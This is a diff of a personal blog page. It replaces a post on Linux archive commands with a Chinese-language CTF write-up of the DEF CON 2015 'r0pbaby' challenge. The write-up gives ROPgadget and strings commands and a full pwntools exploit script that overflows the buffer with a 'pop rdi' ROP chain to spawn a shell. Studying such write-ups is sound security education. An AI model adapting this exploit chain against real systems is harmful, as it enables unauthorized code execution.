@@ -87,7 +87,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="linux," />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -103,17 +103,17 @@
 
 
 
-<meta name="description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
-<meta name="keywords" content="linux">
+<meta name="description" content="64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找    buf的大小是8，会造成缓冲区溢出解题思路1.找到一个gadget RDI2.找到 /bin/sh地址3.找到 system 函数地址查找 gadgetROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;quot;pop|ret&amp;quot;">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux之文件打包与解压缩">
-<meta property="og:url" content="http://yoursite.com/2017/06/06/linux文件压缩/index.html">
+<meta property="og:title" content="'Defcon-2015-Qualifier-r0pbaby'">
+<meta property="og:url" content="http://yoursite.com/2018/03/17/Defcon-2015-Qualifier-r0pbaby/index.html">
 <meta property="og:site_name" content="尿尿">
-<meta property="og:description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
-<meta property="og:updated_time" content="2017-06-06T10:26:05.306Z">
+<meta property="og:description" content="64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找    buf的大小是8，会造成缓冲区溢出解题思路1.找到一个gadget RDI2.找到 /bin/sh地址3.找到 system 函数地址查找 gadgetROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;quot;pop|ret&amp;quot;">
+<meta property="og:updated_time" content="2018-03-26T02:31:45.491Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux之文件打包与解压缩">
-<meta name="twitter:description" content="好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar">
+<meta name="twitter:title" content="'Defcon-2015-Qualifier-r0pbaby'">
+<meta name="twitter:description" content="64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找    buf的大小是8，会造成缓冲区溢出解题思路1.找到一个gadget RDI2.找到 /bin/sh地址3.找到 system 函数地址查找 gadgetROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &amp;quot;pop|ret&amp;quot;">
 
 
 
@@ -141,13 +141,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/06/06/linux文件压缩/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/03/17/Defcon-2015-Qualifier-r0pbaby/"/>
 
 
 
 
 
-  <title> linux之文件打包与解压缩 | 尿尿 </title>
+  <title> 'Defcon-2015-Qualifier-r0pbaby' | 尿尿 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="en">
@@ -314,7 +314,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/06/linux文件压缩/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/17/Defcon-2015-Qualifier-r0pbaby/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Lin Miaoqian">
@@ -335,7 +335,7 @@
             
             
               
-                linux之文件打包与解压缩
+                'Defcon-2015-Qualifier-r0pbaby'
               
             
           </h1>
@@ -350,8 +350,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-06T16:01:56+08:00">
-                2017-06-06
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-17T18:11:32+08:00">
+                2018-03-17
               </time>
             
 
@@ -361,28 +361,6 @@
           </span>
 
           
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/学习/" itemprop="url" rel="index">
-                    <span itemprop="name">学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -391,9 +369,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/06/06/linux文件压缩/#comments" itemprop="discussionUrl">
+                <a href="/2018/03/17/Defcon-2015-Qualifier-r0pbaby/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/06/06/linux文件压缩/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2018/03/17/Defcon-2015-Qualifier-r0pbaby/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -419,7 +397,10 @@
       
 
       
-        <p>好久没有更新啦，尝试过把部分的学习内容直接push到github的仓库上，但是不便查看，所以还是在博客上发表吧。一些基础的学习命令，因为不常用，很快就忘了，还是想好好记下来。<br>本部分关于linx上常用的压缩和解压工具，主要是 zip,rar,tar<br><a id="more"></a> </p>
+        <p>64位需要rdi传参，有PIE保护不能使用程序中的gadget，此处可以从libc中找   </p>
+<p>buf的大小是8，会造成缓冲区溢出<br>解题思路<br>1.找到一个gadget RDI<br>2.找到 <code>/bin/sh</code>地址<br>3.找到 <code>system</code> 函数地址<br>查找 gadget<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;</code><br>查找 /bin/sh 字符串<br><code>strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(&apos;r0pbaby&apos;)</div><div class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</div><div class="line">io = process(&apos;./r0pbaby&apos;)</div><div class="line">sh = next(libc.search(&apos;/bin/sh&apos;))</div><div class="line">sys_offset = libc.symbols[&apos;system&apos;]</div><div class="line">rdi_offset = 0x000000000002144f</div><div class="line"></div><div class="line">def getFun(fun):</div><div class="line">    io.recvuntil(&quot;4) Exit\n:&quot;)</div><div class="line">    io.sendline(&apos;2&apos;)</div><div class="line">    io.recvuntil(&quot;Enter symbol:&quot;)</div><div class="line">    io.sendline(fun)</div><div class="line">    msg = io.recvuntil(&quot;4) Exit\n: &quot;)</div><div class="line">    offset = msg.find(&quot;:&quot;)</div><div class="line">    offset2 = msg.find(&quot;\n&quot;)</div><div class="line">    addr = msg[offset+2:offset2]</div><div class="line">    return long(addr,16)</div><div class="line"></div><div class="line">sys_addr = getFun(&apos;system&apos;) </div><div class="line">sh_addr = sys_addr-sys_offset + sh </div><div class="line">rdi_addr = sys_addr - sys_offset+rdi_offset</div><div class="line"></div><div class="line">payload = &apos;a&apos;*8+p64(rdi_addr)+p64(sh_addr)+p64(sys_addr)</div><div class="line">io.recv()</div><div class="line">io.sendline(&apos;3&apos;)</div><div class="line">io.recv()</div><div class="line">io.sendline(str(len(payload)))</div><div class="line">io.sendline(payload)</div><div class="line">io.recvuntil(&quot;Bad choice.\n&quot;)   </div><div class="line">io.interactive()</div></pre></td></tr></table></figure>
+<p>总结：简单的调用 system + “bin/sh” 通过寄存器 gadget “pop rdi;ret “传参</p>
 
       
     </div>
@@ -449,7 +430,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/linux/" rel="tag"># linux</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -462,8 +443,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/06/06/pictures/" rel="next" title="如何在 hexo 博客中插入图片">
-                <i class="fa fa-chevron-left"></i> 如何在 hexo 博客中插入图片
+              <a href="/2018/03/17/PlaidCTF-2013-ropasaurusrex/" rel="next" title="'PlaidCTF-2013-ropasaurusrex'">
+                <i class="fa fa-chevron-left"></i> 'PlaidCTF-2013-ropasaurusrex'
               </a>
             
           </div>
@@ -472,8 +453,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/14/learncss1/" rel="prev" title="CSS基础学习[1]">
-                CSS基础学习[1] <i class="fa fa-chevron-right"></i>
+              <a href="/2018/03/14/pwnable-tw-orw-writeup/" rel="prev" title="pwnable.tw orw writeup">
+                pwnable.tw orw writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -784,9 +765,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yoursite.com/2017/06/06/linux文件压缩/';
-          this.page.identifier = '2017/06/06/linux文件压缩/';
-          this.page.title = 'linux之文件打包与解压缩';
+          this.page.url = 'http://yoursite.com/2018/03/17/Defcon-2015-Qualifier-r0pbaby/';
+          this.page.identifier = '2018/03/17/Defcon-2015-Qualifier-r0pbaby/';
+          this.page.title = '\'Defcon-2015-Qualifier-r0pbaby\'';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://yuuoniy.disqus.com/embed.js';
